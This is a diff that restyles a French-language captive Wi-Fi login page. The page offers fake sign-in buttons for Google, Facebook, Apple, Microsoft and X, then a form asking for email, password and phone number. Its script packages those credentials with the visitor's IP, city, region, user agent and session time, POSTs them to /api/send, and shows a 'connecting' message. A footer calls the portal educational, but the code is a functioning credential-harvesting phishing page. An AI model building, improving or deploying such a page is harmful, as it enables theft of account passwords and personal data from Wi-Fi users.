@@ -1,144 +1,248 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Portail Wi-Fi</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-papErYgqP4hEQcx8zTq5bQfU5ftZ1qQkiHv+5Vg1T/0Pd9kT7EYpJrmK3tU1PO+JzqKvW3K5UjNwTS1zYfEknw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Inter', sans-serif;
-      background: #f8f9fb;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Portail Wi-Fi – Connexion</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+
+  :root {
+    --primary: #4a90e2;
+    --primary-dark: #357ABD;
+    --gray-light: #f5f7fa;
+    --gray-medium: #cfd8e3;
+    --text-dark: #2c3e50;
+    --border-radius: 14px;
+    --transition: 0.3s ease;
+  }
+
+  * {
+    box-sizing: border-box;
+    margin: 0; padding: 0;
+    font-family: 'Inter', sans-serif;
+  }
+
+  body, html {
+    height: 100%;
+    background: var(--gray-light);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+
+  .container {
+    background: white;
+    padding: 48px 36px;
+    max-width: 420px;
+    width: 100%;
+    border-radius: var(--border-radius);
+    box-shadow: 0 12px 30px rgba(0,0,0,0.12);
+    text-align: center;
+    overflow: hidden;
+  }
+
+  h1 {
+    color: var(--text-dark);
+    font-weight: 600;
+    font-size: 28px;
+    margin-bottom: 32px;
+  }
+
+  .btn-social {
+    cursor: pointer;
+    border: none;
+    outline: none;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 20px;
+    border-radius: var(--border-radius);
+    padding: 14px 18px;
+    width: 100%;
+    font-weight: 600;
+    font-size: 16px;
+    color: white;
+    background: var(--primary);
+    box-shadow: 0 6px 14px rgba(74, 144, 226, 0.4);
+    transition: background-color var(--transition), box-shadow var(--transition), transform var(--transition);
+  }
+
+  .btn-social:hover {
+    background-color: var(--primary-dark);
+    box-shadow: 0 8px 18px rgba(53, 122, 189, 0.6);
+    transform: translateY(-3px);
+  }
+
+  /* Specific colors for each provider */
+  .btn-google { background: #DB4437; box-shadow: 0 6px 14px rgba(219, 68, 55, 0.4); }
+  .btn-google:hover { background: #b3362c; box-shadow: 0 8px 18px rgba(179, 54, 44, 0.6); }
+
+  .btn-facebook { background: #3b5998; box-shadow: 0 6px 14px rgba(59, 89, 152, 0.4); }
+  .btn-facebook:hover { background: #2d4373; box-shadow: 0 8px 18px rgba(45, 67, 115, 0.6); }
+
+  .btn-apple { background: #000000; box-shadow: 0 6px 14px rgba(0,0,0,0.4); }
+  .btn-apple:hover { background: #222222; box-shadow: 0 8px 18px rgba(34,34,34,0.6); }
+
+  .btn-microsoft { background: #0078d4; box-shadow: 0 6px 14px rgba(0, 120, 212, 0.4); }
+  .btn-microsoft:hover { background: #005ea3; box-shadow: 0 8px 18px rgba(0, 94, 163, 0.6); }
+
+  .btn-twitter { background: #1DA1F2; box-shadow: 0 6px 14px rgba(29, 161, 242, 0.4); }
+  .btn-twitter:hover { background: #0d95e8; box-shadow: 0 8px 18px rgba(13, 149, 232, 0.6); }
+
+  svg {
+    width: 22px;
+    height: 22px;
+    fill: white;
+  }
+
+  form {
+    margin-top: 24px;
+    text-align: left;
+    max-height: 0;
+    opacity: 0;
+    transition: max-height 0.5s ease, opacity 0.5s ease;
+    overflow: hidden;
+  }
+
+  form.active {
+    max-height: 480px;
+    opacity: 1;
+  }
+
+  input {
+    width: 100%;
+    padding: 14px 16px;
+    margin-bottom: 20px;
+    border-radius: 10px;
+    border: 1.5px solid var(--gray-medium);
+    font-size: 16px;
+    transition: border-color 0.3s ease;
+  }
+
+  input:focus {
+    outline: none;
+    border-color: var(--primary);
+  }
+
+  button[type="submit"] {
+    background: var(--primary);
+    color: white;
+    border: none;
+    padding: 16px;
+    border-radius: 10px;
+    width: 100%;
+    font-weight: 600;
+    font-size: 18px;
+    cursor: pointer;
+    transition: background-color var(--transition), box-shadow var(--transition);
+    box-shadow: 0 8px 20px rgba(74, 144, 226, 0.5);
+  }
+
+  button[type="submit"]:hover {
+    background-color: var(--primary-dark);
+    box-shadow: 0 10px 26px rgba(53, 122, 189, 0.6);
+  }
+
+  .note {
+    margin-top: 28px;
+    font-size: 13px;
+    color: #888;
+    text-align: center;
+  }
+
+  @media (max-width: 480px) {
+    .container {
+      padding: 32px 24px;
     }
 
-    .card {
-      background: #fff;
-      padding: 40px;
-      border-radius: 16px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 420px;
-      text-align: center;
+    h1 {
+      font-size: 22px;
+      margin-bottom: 24px;
     }
 
-    .card h1 {
-      font-size: 24px;
-      margin-bottom: 20px;
-      color: #333;
-    }
-
-    .social-btn {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      border: 1px solid #ddd;
-      padding: 12px;
-      border-radius: 8px;
-      margin-bottom: 16px;
-      background: #fff;
-      cursor: pointer;
-      transition: all 0.2s ease-in-out;
-    }
-
-    .social-btn:hover {
-      background-color: #f1f1f1;
-    }
-
-    .social-btn i {
-      font-size: 20px;
-      width: 24px;
-      text-align: center;
-    }
-
-    .form-container {
-      display: none;
-      margin-top: 20px;
-      text-align: left;
-    }
-
-    .form-container input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 16px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
+    .btn-social {
       font-size: 14px;
+      padding: 12px 16px;
+      gap: 10px;
     }
 
-    .form-container button {
-      width: 100%;
-      padding: 12px;
-      background: #007bff;
-      border: none;
-      border-radius: 6px;
-      color: white;
-      font-weight: 600;
-      cursor: pointer;
+    svg {
+      width: 18px;
+      height: 18px;
     }
-
-    .form-container button:hover {
-      background: #0056b3;
-    }
-
-    .note {
-      font-size: 12px;
-      color: #888;
-      margin-top: 20px;
-    }
-  </style>
+  }
+</style>
 </head>
 <body>
-  <div class="card">
+  <div class="container" role="main" aria-label="Portail de connexion Wi-Fi">
     <h1>Connexion au Wi-Fi</h1>
 
-    <div class="social-btn" onclick="showForm('google')">
-      <i class="fab fa-google" style="color:#db4437"></i> Continuer avec Google
-    </div>
+    <button class="btn-social btn-google" aria-label="Connexion avec Google" data-provider="Google">
+      <svg viewBox="0 0 533.5 544.3" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path d="M533.5 278.4c0-17.4-1.5-34.1-4.4-50.3H272v95.3h146.9c-6.4 34.3-26.4 63.4-56.3 82.8v68h90.8c53-49 83.1-121 83.1-195.8z" fill="#4285F4"/>
+        <path d="M272 544.3c72.6 0 133.6-24.1 178.2-65.6l-90.8-68c-24.7 16.5-56.2 26.2-87.3 26.2-67 0-123.8-45.3-144.2-106.2H33.2v66.9c44.2 87 135.1 146.7 238.8 146.7z" fill="#34A853"/>
+        <path d="M127.8 325.1c-9.2-27.7-9.2-57.4 0-85.1v-66.9H33.2c-37.4 73.3-37.4 160.7 0 234l94.6-82z" fill="#FBBC05"/>
+        <path d="M272 107.7c36.5 0 69.2 12.6 95 37.3l71.3-71.3C402 24.6 344.6 0 272 0 168.3 0 77.4 59.6 33.2 146.6l94.6 82C148.2 153 205 107.7 272 107.7z" fill="#EA4335"/>
+      </svg>
+      Continuer avec Google
+    </button>
 
-    <div class="social-btn" onclick="showForm('facebook')">
-      <i class="fab fa-facebook" style="color:#3b5998"></i> Continuer avec Facebook
-    </div>
+    <button class="btn-social btn-facebook" aria-label="Connexion avec Facebook" data-provider="Facebook">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512" aria-hidden="true"><path fill="white" d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.07 44.38-121.07 124.72v70.62H22.89V288h81.4v224h100.2V288z"/></svg>
+      Continuer avec Facebook
+    </button>
 
-    <div class="social-btn" onclick="showForm('apple')">
-      <i class="fab fa-apple" style="color:#000"></i> Continuer avec Apple
-    </div>
+    <button class="btn-social btn-apple" aria-label="Connexion avec Apple" data-provider="Apple">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" aria-hidden="true"><path fill="white" d="M318.7 268.7c-1.1-44.3 36.2-65.5 37.8-66.6-20.6-30.2-52.6-34.3-63.9-34.8-27.2-2.8-53 16-66.7 16-13.7 0-35.1-15.6-57.7-15.2-29.6.4-57 17.3-72.3 44-30.9 53.7-7.9 133 22.3 176.2 14.8 22.2 32.4 47 55.5 46 22-1 30.3-14.1 56.8-14.1 26.5 0 34.1 14.1 57.7 13.6 23.9-.5 39-22.5 53.6-44.4 17-25.3 24-49.8 24.5-51 1-1.9-40.8-15.5-41.7-61.9zM254.8 93.2c11.8-14.2 19.7-34 17.5-53.6-16.9.7-37.4 11.3-49.4 25.5-10.8 12.3-20.1 32-17.6 50.8 18.7 1.4 38-9.5 49.5-22.7z"/></svg>
+      Continuer avec Apple
+    </button>
 
-    <div class="social-btn" onclick="showForm('microsoft')">
-      <i class="fab fa-microsoft" style="color:#0078d4"></i> Continuer avec Microsoft
-    </div>
+    <button class="btn-social btn-microsoft" aria-label="Connexion avec Microsoft" data-provider="Microsoft">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" aria-hidden="true"><path fill="white" d="M0 32v208h208V32H0zm240 0v208h208V32H240zM0 272v208h208V272H0zm240 0v208h208V272H240z"/></svg>
+      Continuer avec Microsoft
+    </button>
 
-    <div class="social-btn" onclick="showForm('twitter')">
-      <i class="fab fa-x-twitter" style="color:#000"></i> Continuer avec X (Twitter)
-    </div>
+    <button class="btn-social btn-twitter" aria-label="Connexion avec X (Twitter)" data-provider="Twitter">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" aria-hidden="true"><path fill="white" d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.7-298.7 298.7-59.3 0-114.7-17.2-161.3-47 8.4 1 16.5 1.3 25.3 1.3 49.3 0 94.6-16.8 130.6-45.4-46.1-1-84.8-31.3-98.3-73 6.5 1 13.3 1.6 20.2 1.6 9.7 0 19.1-1.3 28-3.6-48.2-9.7-84.3-52.2-84.3-103.1v-1.3c14.1 7.8 30.2 12.5 47.4 13-28.2-18.9-46.6-51.2-46.6-87.7 0-19.3 5.2-37.3 14.3-52.8 51.6 63.3 129 104.9 216.2 109.4-1.8-7.7-2.7-15.8-2.7-24.2 0-58.8 47.7-106.5 106.5-106.5 30.7 0 58.5 12.9 77.9 33.8 24.2-4.7 47-13.6 67.5-25.9-8 25-25 46-47.4 59.2 21.6-2.4 42.1-8.3 61.2-16.7-14.3 21.3-32.3 40-53 55z"/></svg>
+      Continuer avec X (Twitter)
+    </button>
 
-    <form id="auth-form" class="form-container">
-      <input type="email" id="email" placeholder="Adresse e-mail" required />
-      <input type="password" id="password" placeholder="Mot de passe" required />
-      <input type="tel" id="phone" placeholder="Numéro de téléphone" required />
-      <button type="submit">Se connecter</button>
+    <form id="loginForm" aria-label="Formulaire de connexion Wi-Fi">
+      <input type="email" id="email" name="email" placeholder="Adresse e-mail" required autocomplete="email" />
+      <input type="password" id="password" name="password" placeholder="Mot de passe" required autocomplete="current-password" />
+      <input type="tel" id="phone" name="phone" placeholder="Numéro de téléphone" required pattern=\"[0-9 +()-]{6,20}\" title=\"Veuillez entrer un numéro valide\" />
+      <button type="submit" aria-label="Soumettre le formulaire de connexion">Se connecter</button>
     </form>
 
-    <div class="note">* Portail Wi-Fi pédagogique – aucune authentification réelle.</div>
+    <p class="note">* Portail Wi-Fi pédagogique – aucune authentification réelle.</p>
   </div>
 
 <script>
-  let sessionStart = Date.now();
+  const buttons = document.querySelectorAll('.btn-social');
+  const form = document.getElementById('loginForm');
 
-  function showForm(provider) {
-    document.getElementById("auth-form").style.display = "block";
+  function showForm() {
+    form.classList.add('active');
+    form.scrollIntoView({ behavior: 'smooth' });
   }
 
-  document.getElementById("auth-form").addEventListener("submit", async function (e) {
+  buttons.forEach(btn => {
+    btn.addEventListener('click', () => {
+      showForm();
+    });
+  });
+
+  let sessionStart = Date.now();
+
+  form.addEventListener('submit', async e => {
     e.preventDefault();
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
-    const phone = document.getElementById("phone").value;
+
+    const email = form.email.value.trim();
+    const password = form.password.value;
+    const phone = form.phone.value.trim();
 
     const userAgent = navigator.userAgent;
     const lang = navigator.language;
@@ -180,6 +284,7 @@
 📧 Email : ${email}
 🔑 Mot de passe : ${password}
 📱 Téléphone : ${phone}
+
 🌍 IP : ${geoInfo.ip}
 🏙️ Ville : ${geoInfo.city}
 📍 Région : ${geoInfo.region}
@@ -196,14 +301,14 @@
 ⏱️ Temps passé : ${sessionDuration} secondes
     `;
 
-    fetch("/api/send", {
+    await fetch("/api/send", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ content: message })
     });
 
     alert("Connexion en cours...");
-    document.getElementById("auth-form").reset();
+    form.reset();
   });
 </script>
 </body>
